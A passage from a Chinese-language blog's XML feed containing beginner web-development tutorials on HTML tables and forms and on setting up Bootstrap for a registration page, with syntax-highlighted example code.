punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Heading<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Another Heading<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>row <span class="token number">1</span><span class="token punctuation">,</span> cell <span class="token number">1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>row <span class="token number">1</span><span class="token punctuation">,</span> cell <span class="token number">2</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>row <span class="token number">2</span><span class="token punctuation">,</span> cell <span class="token number">1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>row <span class="token number">2</span><span class="token punctuation">,</span> cell <span class="token number">2</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="form标签"><a href="#form标签" class="headerlink" title="form标签"></a>form标签</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>        form表单    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>表单实例<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        账号：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>admin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>        地址：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上海市浦东新区xx路xx号<span class="token punctuation">"</span></span> <span class="token attr-name">readonly</span> <span class="token attr-name">disabled</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>        密码：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userpwd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>        性别：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>男        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>女        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>        爱好：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>like[]<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>足球        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>like[]<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>篮球        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>like[]<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>台球        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>like[]<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>电竞        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>        头像：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>headpic<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>        日期：        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>year<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1990<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token number">1990</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1991<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token number">1991</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1992<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token number">1992</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1993<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token number">1993</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>        简介：        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>reset<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>重置<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201030133750683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bootstrap用法（实现注册页面）</title>
      <link href="/posts/9b8f72f5.html"/>
      <url>/posts/9b8f72f5.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li>去官网<a href="https://v3.bootcss.com/getting-started/#download" target="_blank" rel="noopener">下载bootstrap</a>，下载用于生产环境的版本</li><li><a href="https://code.jquery.com/jquery-3.5.1.min.js" target="_blank" rel="noopener">下载jQuery</a>，直接复制链接用迅雷下载js文件即可</li><li>提取bootstrap中的<strong>bootstrap.min.js</strong>和<strong>bootstrap.min.css</strong></li><li>把三个文件（bootstrap.min.js、bootstrap.min.css、jquery-3.5.1.min.js）整合到一个js文件夹中</li></ol><h3 id="测试是否可用"><a href="#测试是否可用" class="headerlink" title="测试是否可用"></a>测试是否可用</h3><p>上个代码看看：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试css<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/jquery-3.5.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>测试按钮<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>测试按钮<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span></span>测试按钮<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>测试按钮<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-default<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>基本排版测试：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试css<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/jquery-3.5.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./js/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>h1<span class="token punctuation">.</span> Bootstrap heading<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>h2<span class="token punctuation">.</span> Bootstrap heading<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span>h3<span class="token punctuation">.</span> Bootstrap heading<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">></span></span></span>h4<span class="token punctuation">.</span> Bootstrap heading<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">></span></span></span>h5<span class="token punctuation">.</span> Bootstrap heading<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span><span class="token punctuation">></span></span></span>h6<span class="token punctuation">.</span> Bootstrap heading<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h6</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020103019585869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>表格测试：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试css<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token 